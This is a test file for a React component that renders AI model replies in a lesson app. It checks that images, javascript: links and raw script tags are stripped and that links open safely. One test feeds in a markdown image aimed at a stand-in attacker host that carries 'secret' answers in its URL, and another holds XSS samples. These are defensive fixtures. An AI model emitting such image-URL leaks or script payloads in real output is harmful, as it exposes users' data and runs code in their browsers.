import { renderToStaticMarkup } from 'react-dom/server';
import { describe, expect, it } from 'vitest';
import { LessonText } from './LessonText.jsx';

const render = (text) => renderToStaticMarkup(<LessonText text={text} dir="ltr" />);

describe('LessonText', () => {
  it('never renders images, so a reply cannot leak data through an image URL', () => {
    const html = render('Great! ![x](https://attacker.example/log?answers=secret)');
    expect(html).not.toContain('<img');
    expect(html).not.toContain('attacker.example');
  });

  it('opens links in a new tab without passing on this page', () => {
    const html = render('See [the source](https://example.org/page).');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer nofollow"');
  });

  it('drops script links and raw HTML from model output', () => {
    const html = render('[click](javascript:alert(1)) <script>alert(2)</script>');
    expect(html).not.toContain('javascript:');
    expect(html).not.toContain('<script');
  });

  it('renders formulas with KaTeX', () => {
    expect(render('Area: $x^2$')).toContain('class="katex"');
  });
});
